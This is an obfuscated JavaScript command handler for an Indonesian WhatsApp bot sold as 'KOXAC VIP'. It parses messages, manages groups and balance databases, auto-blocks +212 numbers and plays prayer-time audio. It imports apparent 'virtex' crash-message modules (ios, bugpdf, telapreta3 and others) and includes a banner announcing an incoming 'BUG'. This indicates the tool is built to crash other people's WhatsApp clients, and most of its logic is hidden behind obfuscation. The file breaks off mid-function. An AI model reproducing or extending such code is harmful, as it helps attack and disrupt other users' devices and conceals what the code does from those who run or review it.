/*
        -NOTE-
   -SCRIPT KOXAC VIP
   -SCRIPT FROM DEV ALWI
   -JANGAN DIJUAL
   -TIDAK BOLEH DISEBAR
   -ANTI RIAL 5HARI DEK
  
-----╔╗╔═╦═══╦═╗╔═╦═══╦═══╗
----║║║╔╣╔═╗╠╗╚╝╔╣╔═╗║╔═╗║
---║╚╝╝║║─║║╚╗╔╝║║─║║║─╚╝
--║╔╗║║║─║║╔╝╚╗║╚═╝║║─╔╗
-║║║╚╣╚═╝╠╝╔╗╚╣╔═╗║╚═╝║
╚╝╚═╩═══╩═╝╚═╩╝─╚╩═══╝
   
*/
module.exports = async (zyn, m, store) => {
try {
const _0x316f26 = _0x6457;
(function (_0xc04a08, _0x3b2df0) {
    const _0x2e12c0 = _0x6457, _0x573704 = _0xc04a08();
    while (!![]) {
        try {
            const _0x3526f4 = -parseInt(_0x2e12c0(0x114)) / (0x53d + -0x2075 + 0x1b39) + parseInt(_0x2e12c0(0x145)) / (-0x3b * -0x53 + 0x1dcc + 0x6fd * -0x7) + parseInt(_0x2e12c0(0x12b)) / (0x5b3 + 0x1 * 0x2581 + -0x2b31) * (-parseInt(_0x2e12c0(0x128)) / (-0x15e0 + 0x9 * -0x24f + -0x21 * -0x14b)) + -parseInt(_0x2e12c0(0x133)) / (0xc19 + 0x1 * -0x219c + 0x1588) * (parseInt(_0x2e12c0(0x14a)) / (0x2089 * 0x1 + 0x228a + -0xd69 * 0x5)) + -parseInt(_0x2e12c0(0x123)) / (0x2136 + -0xcb + -0x2 * 0x1032) * (parseInt(_0x2e12c0(0x10e)) / (-0x24f5 + -0x1a06 + 0x11b * 0x39)) + -parseInt(_0x2e12c0(0xfc)) / (0x108 + 0x1136 + -0x1235) * (parseInt(_0x2e12c0(0x13e)) / (-0x67f * 0x1 + -0x1d4 + 0x85d * 0x1)) + parseInt(_0x2e12c0(0x125)) / (0x10da + -0x2 * -0xd22 + -0x2b13);
            if (_0x3526f4 === _0x3b2df0)
                break;
            else
                _0x573704['push'](_0x573704['shift']());
        } catch (_0x3004b5) {
            _0x573704['push'](_0x573704['shift']());
        }
    }
}(_0x3487, -0x1 * 0x10e887 + 0x1 * -0x30129 + 0x2d1 * 0xa9b));
function _0x6457(_0x132935, _0x33febf) {
    const _0x2a7a1f = _0x3487();
    return _0x6457 = function (_0x2c330a, _0x13cf36) {
        _0x2c330a = _0x2c330a - (-0x4c3 * -0x1 + -0x24c4 + 0x20fc);
        let _0x2c8902 = _0x2a7a1f[_0x2c330a];
        return _0x2c8902;
    }, _0x6457(_0x132935, _0x33febf);
}
const from = m[_0x316f26(0x144)][_0x316f26(0x13a)], quoted = m[_0x316f26(0x11b)] ? m[_0x316f26(0x11b)] : m;
var body = m[_0x316f26(0x143)] === _0x316f26(0x12c) + _0x316f26(0x103) + _0x316f26(0x135) ? JSON[_0x316f26(0x109)](m[_0x316f26(0x120)][_0x316f26(0x12c) + _0x316f26(0x103) + _0x316f26(0x135)][_0x316f26(0x108) + _0x316f26(0x132) + _0x316f26(0x137)][_0x316f26(0x12a)])['id'] : m[_0x316f26(0x143)] === _0x316f26(0x14d) + 'on' ? m[_0x316f26(0x120)][_0x316f26(0x14d) + 'on'] : m[_0x316f26(0x143)] == _0x316f26(0x15a) + 'ge' ? m[_0x316f26(0x120)][_0x316f26(0x15a) + 'ge'][_0x316f26(0x131)] : m[_0x316f26(0x143)] == _0x316f26(0x107) + 'ge' ? m[_0x316f26(0x120)][_0x316f26(0x107) + 'ge'][_0x316f26(0x131)] : m[_0x316f26(0x143)] == _0x316f26(0x154) + _0x316f26(0x147) ? m[_0x316f26(0x120)][_0x316f26(0x154) + _0x316f26(0x147)][_0x316f26(0x142)] : m[_0x316f26(0x143)] == _0x316f26(0x10f) + _0x316f26(0x162) + 'ge' ? m[_0x316f26(0x120)][_0x316f26(0x10f) + _0x316f26(0x162) + 'ge'][_0x316f26(0x153) + _0x316f26(0x129)] : m[_0x316f26(0x143)] == _0x316f26(0x14c) + _0x316f26(0x130) ? m[_0x316f26(0x120)][_0x316f26(0x14c) + _0x316f26(0x130)][_0x316f26(0x156) + _0x316f26(0x15d)][_0x316f26(0x14e) + _0x316f26(0x11e)] : m[_0x316f26(0x143)] == _0x316f26(0x10c) + _0x316f26(0x151) + _0x316f26(0x135) ? m[_0x316f26(0x120)][_0x316f26(0x10c) + _0x316f26(0x151) + _0x316f26(0x135)][_0x316f26(0x160)] : m[_0x316f26(0x143)] == _0x316f26(0x126) + _0x316f26(0x13d) ? m[_0x316f26(0x120)][_0x316f26(0x10f) + _0x316f26(0x162) + 'ge']?.[_0x316f26(0x153) + _0x316f26(0x129)] || m[_0x316f26(0x120)][_0x316f26(0x14c) + _0x316f26(0x130)]?.[_0x316f26(0x156) + _0x316f26(0x15d)][_0x316f26(0x14e) + _0x316f26(0x11e)] || m[_0x316f26(0x142)] : '';
const budy = typeof m[_0x316f26(0x142)] == _0x316f26(0x161) ? m[_0x316f26(0x142)] : '', prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/[_0x316f26(0x12e)](body) ? body[_0x316f26(0x11d)](/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.', isCmd = body[_0x316f26(0x124)](prefix), command = body[_0x316f26(0x117)](prefix, '')[_0x316f26(0x158)]()[_0x316f26(0x105)](/ +/)[_0x316f26(0x121)]()[_0x316f26(0x15b) + 'e'](), args = body[_0x316f26(0x158)]()[_0x316f26(0x105)](/ +/)[_0x316f26(0x148)](0x22d5 + -0x7aa + 0x2 * -0xd95), mime = (quoted[_0x316f26(0x115)] || quoted)[_0x316f26(0x10d)] || '', text = q = args[_0x316f26(0x11c)]('\x20'), isGroup = from[_0x316f26(0x119)](_0x316f26(0x15f)), botNumber = await zyn[_0x316f26(0x140)](zyn[_0x316f26(0xfd)]['id']), sender = m[_0x316f26(0x144)][_0x316f26(0x149)] ? zyn[_0x316f26(0xfd)]['id'][_0x316f26(0x105)](':')[-0xe1 + -0x1330 * 0x2 + 0x305 * 0xd] + (_0x316f26(0x163) + _0x316f26(0x11f)) || zyn[_0x316f26(0xfd)]['id'] : m[_0x316f26(0x144)][_0x316f26(0x116) + 't'] || m[_0x316f26(0x144)][_0x316f26(0x13a)], senderNumber = sender[_0x316f26(0x105)]('@')[0x5c * -0x1 + -0x136f * 0x2 + 0x2 * 0x139d], pushname = m[_0x316f26(0x139)] || '' + senderNumber, isBot = botNumber[_0x316f26(0x15c)](senderNumber), groupMetadata = isGroup ? await zyn[_0x316f26(0x112) + _0x316f26(0x111)](m[_0x316f26(0x110)])[_0x316f26(0x101)](_0x1c3af0 => {
    }) : '', groupName = isGroup ? groupMetadata[_0x316f26(0x134)] : '', participants = isGroup ? await groupMetadata[_0x316f26(0x116) + 'ts'] : '', groupAdmins = isGroup ? await participants[_0x316f26(0x104)](_0x35b168 => _0x35b168[_0x316f26(0x102)] !== null)[_0x316f26(0x127)](_0xd2e698 => _0xd2e698['id']) : '', groupOwner = isGroup ? groupMetadata[_0x316f26(0x113)] : '', groupMembers = isGroup ? groupMetadata[_0x316f26(0x116) + 'ts'] : '', isBotAdmins = isGroup ? groupAdmins[_0x316f26(0x15c)](botNumber) : ![], isBotGroupAdmins = isGroup ? groupAdmins[_0x316f26(0x15c)](botNumber) : ![], isGroupAdmins = isGroup ? groupAdmins[_0x316f26(0x15c)](sender) : ![], totalFitur = () => {
        const _0x2a9603 = _0x316f26, _0x33c630 = { 'ARNIV': _0x2a9603(0x155) + 'js' };
        var _0x1dd875 = fs[_0x2a9603(0x152) + 'nc'](_0x33c630[_0x2a9603(0x150)])[_0x2a9603(0x15e)](), _0x34b675 = (_0x1dd875[_0x2a9603(0x11d)](/case '/g) || [])[_0x2a9603(0x12d)];
        return _0x34b675;
    }, isAdmins = isGroup ? groupAdmins[_0x316f26(0x15c)](sender) : ![], tanggal = moment['tz'](_0x316f26(0x14b) + 'ta')[_0x316f26(0x10a)](_0x316f26(0x14f)), {Client} = require(_0x316f26(0x13f)), jsobfus = require(_0x316f26(0xfb) + _0x316f26(0x13c) + 'r'), {addSaldo, minSaldo, cekSaldo} = require(_0x316f26(0xff) + _0x316f26(0xfe) + _0x316f26(0x118)), {mediafireDl} = require(_0x316f26(0xff) + _0x316f26(0x12f) + _0x316f26(0x106));
let db_saldo = JSON[_0x316f26(0x109)](fs[_0x316f26(0x152) + 'nc'](_0x316f26(0xff) + _0x316f26(0x122) + _0x316f26(0x100)));
function _0x3487() {
    const _0x38fc80 = [
        'ctReply',
        'toString',
        '@g.us',
        'selectedId',
        'string',
        'ponseMessa',
        '@s.whatsap',
        'javascript',
        '1376316SnUPgX',
        'user',
        '/dtbs/depo',
        './database',
        'o.json',
        'catch',
        'admin',
        'eResponseM',
        'filter',
        'split',
        'afire.js',
        'videoMessa',
        'nativeFlow',
        'parse',
        'format',
        '/lib/hdr.j',
        'templateBu',
        'mimetype',
        '62144oRFGLt',
        'buttonsRes',
        'chat',
        'ata',
        'groupMetad',
        'owner',
        '26586wniiKM',
        'msg',
        'participan',
        'replace',
        'sit',
        'endsWith',
        '/image/Xyn',
        'quoted',
        'join',
        'match',
        'wId',
        'p.net',
        'message',
        'shift',
        '/dtbs/sald',
        '945GvSFVS',
        'startsWith',
        '33168949CDGNmj',
        'messageCon',
        'map',
        '1025452YDsYbn',
        'ttonId',
        'paramsJson',
        '12MIcTqk',
        'interactiv',
        'length',
        'test',
        '/dtbs/medi',
        'seMessage',
        'caption',
        'ResponseMe',
        '624905vERwat',
        'subject',
        'essage',
        'z.jpg',
        'ssage',
        '/image/zko',
        'pushName',
        'remoteJid',
        '𝙓𝘼𝘾\x20☣️',
        '-obfuscato',
        'textInfo',
        '40SqNeOJ',
        'ssh2',
        'decodeJid',
        'song.png',
        'text',
        'mtype',
        'key',
        '2448858NEzlkI',
        '𝙊𝙏𝙒\x20𝘿𝙀𝙆\x20𝙆𝙊',
        'xtMessage',
        'slice',
        'fromMe',
        '42kCBEpQ',
        'Asia/Jakar',
        'listRespon',
        'conversati',
        'selectedRo',
        'DD/MM/YY',
        'ARNIV',
        'ttonReplyM',
        'readFileSy',
        'selectedBu',
        'extendedTe',
        './nugraha.',
        'singleSele',
        'g.jpg',
        'trim',
        '/image/xbu',
        'imageMessa',
        'toLowerCas',
        'includes'
    ];
    _0x3487 = function () {
        return _0x38fc80;
    };
    return _0x3487();
}
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const Koxac = fs.readFileSync(`./database/image/Koxac.jpg`)
const Alwi = fs.readFileSync(`./database/image/Alwi.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = '𝙂𝙊𝙍𝙀𝙉𝙂 𝙆𝙀𝙉𝙏𝘼𝙉𝙂 𝙂𝙊𝙍𝙀𝙉𝙂 𝙉𝙐𝙂𝙀𝙏 𝙒𝘼𝙍𝙀𝙂, 𝘽𝙐𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙊𝙏𝙒 🤪'

// ALWI

		function _0x1a1a() {
    const _0x200fc4 = [
        '670648lOajEw',
        '142152VzYdtp',
        'lapreta3.j',
        'gpdf.js',
        'nvite.js',
        '17647870Hduqij',
        'gUrl.js',
        's.js',
        '3177867UVRRUI',
        '/virtex/co',
        '/virtex/te',
        '4753278TQRLJu',
        '781744wTDvxf',
        '44fMhknj',
        '5SeGtxK',
        '/virtex/bu',
        './database',
        '/virtex/io',
        '1106354pWhHxG',
        '9eXOZMK'
    ];
    _0x1a1a = function () {
        return _0x200fc4;
    };
    return _0x1a1a();
}
function _0x23cd(_0x95599a, _0x2b22de) {
    const _0x246e5e = _0x1a1a();
    return _0x23cd = function (_0xc06b9d, _0x3e8973) {
        _0xc06b9d = _0xc06b9d - (-0xe31 + -0xc3a + 0x1 * 0x1b1a);
        let _0x1885bb = _0x246e5e[_0xc06b9d];
        return _0x1885bb;
    }, _0x23cd(_0x95599a, _0x2b22de);
}
const _0x1459d4 = _0x23cd;
(function (_0xde09b, _0x36b633) {
    const _0x2f8ca0 = _0x23cd, _0x4cca04 = _0xde09b();
    while (!![]) {
        try {
            const _0x5eaf3f = -parseInt(_0x2f8ca0(0xb8)) / (0x6 * -0x5bb + 0x1835 + 0xa2e) + parseInt(_0x2f8ca0(0xb6)) / (0x9 * -0x152 + -0x26 * -0x71 + -0x4e2) + -parseInt(_0x2f8ca0(0xb9)) / (0x1652 * -0x1 + -0x1c51 + -0x2 * -0x1953) * (parseInt(_0x2f8ca0(0xb1)) / (0x29b + 0xe32 + -0x10c9)) + -parseInt(_0x2f8ca0(0xb2)) / (-0x11dd + 0x1f * -0x35 + 0x184d) * (parseInt(_0x2f8ca0(0xaf)) / (-0x9f9 + -0xe67 + 0x1866)) + parseInt(_0x2f8ca0(0xc0)) / (0x274 + -0x30f * 0x1 + 0xa2) + -parseInt(_0x2f8ca0(0xb0)) / (0xa3 * 0x25 + -0x1d50 + -0x1 * -0x5c9) * (parseInt(_0x2f8ca0(0xb7)) / (0x1 * -0x19b5 + -0x21f5 + 0x3bb3)) + parseInt(_0x2f8ca0(0xbd)) / (-0x7bd + 0x9d1 * -0x1 + 0x1198);
            if (_0x5eaf3f === _0x36b633)
                break;
            else
                _0x4cca04['push'](_0x4cca04['shift']());
        } catch (_0x5706f5) {
            _0x4cca04['push'](_0x4cca04['shift']());
        }
    }
}(_0x1a1a, -0x13fff * -0xb + -0x4 * -0x5223a + -0x17c0ff));
const {ios} = require(_0x1459d4(0xb4) + _0x1459d4(0xb5) + _0x1459d4(0xbf)), {telapreta3} = require(_0x1459d4(0xb4) + _0x1459d4(0xc2) + _0x1459d4(0xba) + 's'), {convite} = require(_0x1459d4(0xb4) + _0x1459d4(0xc1) + _0x1459d4(0xbc)), {bugpdf} = require(_0x1459d4(0xb4) + _0x1459d4(0xb3) + _0x1459d4(0xbb)), {cP} = require(_0x1459d4(0xb4) + _0x1459d4(0xb3) + _0x1459d4(0xbe));
	
	
// Auto Blocked Nomor +212
var _0x2d88ef = _0x4b70;
(function (_0x5aff35, _0x396a73) {
    var _0x3d79a5 = _0x4b70, _0x279384 = _0x5aff35();
    while (!![]) {
        try {
            var _0x34920e = -parseInt(_0x3d79a5(0x1a3)) / (-0x2 * 0x8bd + -0xc2 * -0x20 + -0x6c5) * (-parseInt(_0x3d79a5(0x1a4)) / (-0x247a + -0x181 * 0x1 + 0x185 * 0x19)) + -parseInt(_0x3d79a5(0x1a5)) / (-0x55 * 0x5 + 0x9e * 0x1b + -0xefe) + -parseInt(_0x3d79a5(0x1b1)) / (0x88 * 0x16 + 0x2559 + -0x59 * 0x8d) + -parseInt(_0x3d79a5(0x1aa)) / (-0x8 * -0x2b7 + -0x87b + 0x8 * -0x1a7) * (parseInt(_0x3d79a5(0x1ab)) / (-0x9db * -0x3 + 0x19d * -0xd + -0x2 * 0x449)) + -parseInt(_0x3d79a5(0x1ae)) / (0x4 * -0x74c + -0x5b * 0x4a + 0x3785) + parseInt(_0x3d79a5(0x1af)) / (-0x1b00 + 0x305 * 0x1 + 0x1803 * 0x1) + -parseInt(_0x3d79a5(0x1a9)) / (-0xeca + 0x61 * -0x57 + 0x2fca) * (-parseInt(_0x3d79a5(0x1ac)) / (-0x262 + 0xd * -0xc7 + 0xc87 * 0x1));
            if (_0x34920e === _0x396a73)
                break;
            else
                _0x279384['push'](_0x279384['shift']());
        } catch (_0x50b846) {
            _0x279384['push'](_0x279384['shift']());
        }
    }
}(_0x5733, -0x4 * -0xe84e + 0x323e1 * 0x1 + -0x23 * 0x1931));
if (m[_0x2d88ef(0x1ad)][_0x2d88ef(0x1b0)](_0x2d88ef(0x1a8)))
    return zyn[_0x2d88ef(0x1b2) + _0x2d88ef(0x1a6)](m[_0x2d88ef(0x1ad)], _0x2d88ef(0x1a7));
function _0x4b70(_0x507d3b, _0x1d4c8f) {
    var _0xc81f33 = _0x5733();
    return _0x4b70 = function (_0x48797b, _0x220aaa) {
        _0x48797b = _0x48797b - (0x9e * -0x39 + -0x1215 * 0x1 + -0x2 * -0x1b73);
        var _0x1b1cab = _0xc81f33[_0x48797b];
        return _0x1b1cab;
    }, _0x4b70(_0x507d3b, _0x1d4c8f);
}
function _0x5733() {
    var _0x3d2fb1 = [
        'updateBloc',
        '226613qQNUAv',
        '2GitQmA',
        '374307dvGMii',
        'kStatus',
        'block',
        '212',
        '8100XWAtkB',
        '45RFrTxp',
        '77754GPaidP',
        '3680CcExFM',
        'sender',
        '1738541zlWlmV',
        '2704272duaDTu',
        'startsWith',
        '752504vMSEBM'
    ];
    _0x5733 = function () {
        return _0x3d2fb1;
    };
    return _0x5733();
}

// Random Color
const _0x3e95c4 = _0x48b7;
function _0x48b7(_0x268f51, _0x5079d2) {
    const _0x5013d5 = _0x2172();
    return _0x48b7 = function (_0x381cd2, _0x583adc) {
        _0x381cd2 = _0x381cd2 - (0x1724 + -0xbef * 0x1 + -0xa32);
        let _0x223a46 = _0x5013d5[_0x381cd2];
        return _0x223a46;
    }, _0x48b7(_0x268f51, _0x5079d2);
}
(function (_0x1b998, _0xe13978) {
    const _0x3d5ea2 = _0x48b7, _0x53892d = _0x1b998();
    while (!![]) {
        try {
            const _0x5342d9 = -parseInt(_0x3d5ea2(0x110)) / (-0x2 * -0x983 + -0x44d * -0x3 + -0x38c * 0x9) + parseInt(_0x3d5ea2(0x12c)) / (-0x19 * 0x84 + 0x1b31 + -0xe4b) * (-parseInt(_0x3d5ea2(0x13a)) / (-0x246b + -0x17ac + 0x3c1a)) + parseInt(_0x3d5ea2(0x13f)) / (-0x1b2c + -0x2bb * -0x9 + 0x29d) + parseInt(_0x3d5ea2(0x113)) / (0x39a * -0x9 + 0x6ab * 0x4 + 0x5c3) + parseInt(_0x3d5ea2(0x108)) / (-0xd36 + 0xb8d * 0x1 + 0x1af) * (parseInt(_0x3d5ea2(0x147)) / (-0x169c + -0x89 * -0x1e + 0x695)) + parseInt(_0x3d5ea2(0x104)) / (0x49 * 0x42 + 0x15b2 + 0xa1f * -0x4) * (-parseInt(_0x3d5ea2(0x141)) / (0x1d16 + -0xf * -0x251 + 0x3fcc * -0x1)) + -parseInt(_0x3d5ea2(0x115)) / (0x157b + 0x187a + -0x2deb * 0x1) * (-parseInt(_0x3d5ea2(0x129)) / (-0x272 + 0x53 * 0x1 + 0x22a));
            if (_0x5342d9 === _0xe13978)
                break;
            else
                _0x53892d['push'](_0x53892d['shift']());
        } catch (_0x3379e0) {
            _0x53892d['push'](_0x53892d['shift']());
        }
    }
}(_0x2172, -0x22779 * -0x6 + 0x4 * -0x470db + 0x12c752));
const listcolor = [
        _0x3e95c4(0x10f),
        _0x3e95c4(0x136),
        _0x3e95c4(0x128),
        _0x3e95c4(0x13b),
        _0x3e95c4(0x139),
        _0x3e95c4(0x125),
        _0x3e95c4(0x107)
    ], randomcolor = listcolor[Math[_0x3e95c4(0x11f)](Math[_0x3e95c4(0x122)]() * listcolor[_0x3e95c4(0x12b)])];
let run = runtime(process[_0x3e95c4(0x109)]());
isCmd && console[_0x3e95c4(0x148)](chalk[_0x3e95c4(0x107)][_0x3e95c4(0x131)][_0x3e95c4(0x124)](_0x3e95c4(0x137) + _0x3e95c4(0x134)), color(_0x3e95c4(0x126), _0x3e95c4(0x136)), color(_0x3e95c4(0x12d), _0x3e95c4(0x10f)), color('' + pushname, _0x3e95c4(0x10f)), color(_0x3e95c4(0x14a), _0x3e95c4(0x128)), color('' + body, _0x3e95c4(0x13b)));
function _0x2172() {
    const _0x3ca902 = [
        'Selamat\x20Su',
        'yellow',
        '5150497FfbYoK',
        '03:00:00',
        'length',
        '268918wJSFiO',
        'FROM',
        '06:02',
        '19:00:00',
        '12:02',
        'bgRed',
        '18:00:00',
        'chat',
        '\x20Om',
        'HH:mm:ss',
        'green',
        'Ada\x20Pesan,',
        'gi\x20🌄',
        'magenta',
        '21uvRRmI',
        'blue',
        'dddd,\x20DD\x20M',
        '04:29',
        'format',
        '3532280sZXgCk',
        'Asia/Jayap',
        '9LZMQWU',
        '17:52',
        '05:44',
        'Selamat\x20So',
        'autoshalat',
        'sar',
        '14gCKVZg',
        'log',
        'ang\x20🌤️',
        'Text\x20:',
        'Selamat\x20Ma',
        '2517904fUXptT',
        '19:01',
        'Asia/Makas',
        'white',
        '956190VjgTHV',
        'uptime',
        '15:15',
        're\x20🌇',
        'HH\x20:\x20mm\x20:s',
        'Selamat\x20Pe',
        '15:00:00',
        'red',
        '795289ttQwRu',
        'ngah\x20Malam',
        'buh\x20🌆',
        '1791775ZyOErb',
        '05:00:00',
        '30hXonLc',
        'MMM\x20YYYY',
        '10:00:00',
        'tang\x20🌆',
        'lam\x20🏙️',
        'Selamat\x20Pa',
        'Selamat\x20Te',
        'ura',
        'Selamat\x20Si',
        'HH\x20:\x20mm\x20:\x20',
        'floor',
        '23:59:00',
        '\x20🌃',
        'random',
        'Asia/Jakar',
        'bold',
        'cyan',
        '[\x20𝙆𝙊𝙓𝘼𝘾\x20]'
    ];
    _0x2172 = function () {
        return _0x3ca902;
    };
    return _0x2172();
}
const hariini = moment['tz'](_0x3e95c4(0x123) + 'ta')[_0x3e95c4(0x13e)](_0x3e95c4(0x13c) + _0x3e95c4(0x116)), wib = moment['tz'](_0x3e95c4(0x123) + 'ta')[_0x3e95c4(0x13e)](_0x3e95c4(0x10c) + 's'), wit = moment['tz'](_0x3e95c4(0x140) + _0x3e95c4(0x11c))[_0x3e95c4(0x13e)](_0x3e95c4(0x11e) + 'ss'), wita = moment['tz'](_0x3e95c4(0x106) + _0x3e95c4(0x146))[_0x3e95c4(0x13e)](_0x3e95c4(0x11e) + 'ss'), time2 = moment()['tz'](_0x3e95c4(0x123) + 'ta')[_0x3e95c4(0x13e)](_0x3e95c4(0x135));
if (time2 < _0x3e95c4(0x120))
    var ucapanWaktu = _0x3e95c4(0x103) + _0x3e95c4(0x119);
if (time2 < _0x3e95c4(0x12f))
    var ucapanWaktu = _0x3e95c4(0x10d) + _0x3e95c4(0x118);
if (time2 < _0x3e95c4(0x132))
    var ucapanWaktu = _0x3e95c4(0x144) + _0x3e95c4(0x10b);
if (time2 < _0x3e95c4(0x10e))
    var ucapanWaktu = _0x3e95c4(0x11d) + _0x3e95c4(0x149);
if (time2 < _0x3e95c4(0x117))
    var ucapanWaktu = _0x3e95c4(0x11a) + _0x3e95c4(0x138);
if (time2 < _0x3e95c4(0x114))
    var ucapanWaktu = _0x3e95c4(0x127) + _0x3e95c4(0x112);
if (time2 < _0x3e95c4(0x12a))
    var ucapanWaktu = _0x3e95c4(0x11b) + _0x3e95c4(0x111) + _0x3e95c4(0x121);
zyn[_0x3e95c4(0x145)] = zyn[_0x3e95c4(0x145)] ? zyn[_0x3e95c4(0x145)] : {};
let id = m[_0x3e95c4(0x133)];
if (id in zyn[_0x3e95c4(0x145)])
    return ![];
let jadwalSholat = {
    'shubuh': _0x3e95c4(0x13d),
    'terbit': _0x3e95c4(0x143),
    'dhuha': _0x3e95c4(0x12e),
    'dzuhur': _0x3e95c4(0x130),
    'ashar': _0x3e95c4(0x10a),
    'magrib': _0x3e95c4(0x142),
    'isya': _0x3e95c4(0x105)
};
    const _0x3cacce = _0xd174;
function _0xd174(_0x45c28, _0x2f54c0) {
    const _0x340359 = _0x18a5();
    return _0xd174 = function (_0x18315d, _0x1123bf) {
        _0x18315d = _0x18315d - (-0xe4c + 0x2187 + 0x1 * -0x11f5);
        let _0x290e94 = _0x340359[_0x18315d];
        return _0x290e94;
    }, _0xd174(_0x45c28, _0x2f54c0);
}
(function (_0x2015d8, _0x3bbe59) {
    const _0xa05eb9 = _0xd174, _0x3833d7 = _0x2015d8();
    while (!![]) {
        try {
            const _0x33c819 = -parseInt(_0xa05eb9(0x150)) / (-0x7 * 0x3ce + -0x2 * -0x6f3 + -0xcbd * -0x1) * (parseInt(_0xa05eb9(0x153)) / (-0x163a + 0x46d + 0x11cf)) + parseInt(_0xa05eb9(0x147)) / (-0x21be + 0xbbc + 0x1605) * (parseInt(_0xa05eb9(0x14c)) / (0x2 * 0x4c3 + 0x19e9 + -0x1 * 0x236b)) + parseInt(_0xa05eb9(0x154)) / (0x1237 * -0x2 + -0x179f * -0x1 + 0x1 * 0xcd4) * (parseInt(_0xa05eb9(0x149)) / (-0x1 * -0x9ab + 0x18e0 + -0x2285)) + parseInt(_0xa05eb9(0x14f)) / (0xd39 + 0x118b + -0x1ebd) * (-parseInt(_0xa05eb9(0x146)) / (-0x16d3 + -0x1640 + -0x503 * -0x9)) + parseInt(_0xa05eb9(0x14d)) / (-0x28d * -0xf + -0x374 + -0x22c6) + parseInt(_0xa05eb9(0x14b)) / (0x33a * 0x1 + 0x11f * -0x17 + -0x1 * -0x1699) + -parseInt(_0xa05eb9(0x152)) / (-0x2063 + 0xa * -0x4f + 0x1 * 0x2384);
            if (_0x33c819 === _0x3bbe59)
                break;
            else
                _0x3833d7['push'](_0x3833d7['shift']());
        } catch (_0x8231c) {
            _0x3833d7['push'](_0x3833d7['shift']());
        }
    }
}(_0x18a5, 0x1b0d9 + -0x3341a + -0x5816d * -0x1));
const datek = new Date(new Date()[_0x3cacce(0x14e) + _0x3cacce(0x151)](_0x3cacce(0x14a), { 'timeZone': _0x3cacce(0x148) + 'ta' }));
function _0x18a5() {
    const _0x470127 = [
        'ring',
        '7530699upwZry',
        '16zgRcCA',
        '1155370vBCLMW',
        '2792PDVrcq',
        '3WBwrAv',
        'Asia/Jakar',
        '6AkWoIK',
        'en-US',
        '2380650wkQXbK',
        '1828964tVrcFr',
        '2533554oRcKFY',
        'toLocaleSt',
        '3787avezLR',
        '9099mOwpIS'
    ];
    _0x18a5 = function () {
        return _0x470127;
    };
    return _0x18a5();
}
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        zyn.autoshalat[id] = [
            zyn.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
function _0x2a5b() {
    const _0x4c520a = [
        '10516248cPMrmw',
        '11450523DziRSz',
        'readFileSy',
        '/dtbs/cont',
        '7028072pvGNgR',
        '50yUjNhh',
        'parse',
        '/dtbs/owne',
        './database',
        '32921vNyvJu',
        'ium.json',
        'acts.json',
        'r.json',
        '9198695tvKjiM',
        '/dtbs/prem',
        '1562200ZcHBlu',
        '4508871WluNvp'
    ];
    _0x2a5b = function () {
        return _0x4c520a;
    };
    return _0x2a5b();
}
const _0x365525 = _0x1a72;
(function (_0x16a65a, _0x4ca3ae) {
    const _0x4be993 = _0x1a72, _0x4f24db = _0x16a65a();
    while (!![]) {
        try {
            const _0x54a3a3 = -parseInt(_0x4be993(0x179)) / (0x109c + -0x1b12 + 0xa77) * (parseInt(_0x4be993(0x175)) / (-0xa1c + -0x7c1 * -0x2 + -0x159 * 0x4)) + -parseInt(_0x4be993(0x16f)) / (-0x5b4 * -0x2 + 0xed * 0x13 + -0x1cfc) + parseInt(_0x4be993(0x174)) / (-0xdad + -0x2677 * 0x1 + 0xd0a * 0x4) + parseInt(_0x4be993(0x16c)) / (0x2 * -0x699 + 0x175 + -0x1 * -0xbc2) + -parseInt(_0x4be993(0x170)) / (0x17f * -0xb + -0x1805 + 0x360 * 0xc) + parseInt(_0x4be993(0x171)) / (-0xa91 + 0x1cc0 + -0x1228) + -parseInt(_0x4be993(0x16e)) / (-0x1 * 0xd3b + -0x18 * 0x172 + 0x2ff3);
            if (_0x54a3a3 === _0x4ca3ae)
                break;
            else
                _0x4f24db['push'](_0x4f24db['shift']());
        } catch (_0x2188d2) {
            _0x4f24db['push'](_0x4f24db['shift']());
        }
    }
}(_0x2a5b, 0x45fb4 + -0x1c86f4 + 0x26c7b5));
function _0x1a72(_0x2dffe4, _0x2264da) {
    const _0x40e33f = _0x2a5b();
    return _0x1a72 = function (_0x5a51a1, _0x5afa9a) {
        _0x5a51a1 = _0x5a51a1 - (-0x376 + -0x1828 + -0x3f * -0x76);
        let _0x1b3861 = _0x40e33f[_0x5a51a1];
        return _0x1b3861;
    }, _0x1a72(_0x2dffe4, _0x2264da);
}
const contacts = JSON[_0x365525(0x176)](fs[_0x365525(0x172) + 'nc'](_0x365525(0x178) + _0x365525(0x173) + _0x365525(0x17b))), prem = JSON[_0x365525(0x176)](fs[_0x365525(0x172) + 'nc'](_0x365525(0x178) + _0x365525(0x16d) + _0x365525(0x17a))), ownerNumber = JSON[_0x365525(0x176)](fs[_0x365525(0x172) + 'nc'](_0x365525(0x178) + _0x365525(0x177) + _0x365525(0x17c)));

// Cek Database
const _0x493981 = _0x1752;
function _0x1752(_0x50df4d, _0x140149) {
    const _0x2059a2 = _0x3feb();
    return _0x1752 = function (_0x59942f, _0xbdc2b0) {
        _0x59942f = _0x59942f - (-0x5f * -0x58 + 0xb2e + -0x2a22);
        let _0x184731 = _0x2059a2[_0x59942f];
        return _0x184731;
    }, _0x1752(_0x50df4d, _0x140149);
}
(function (_0x493af3, _0x243498) {
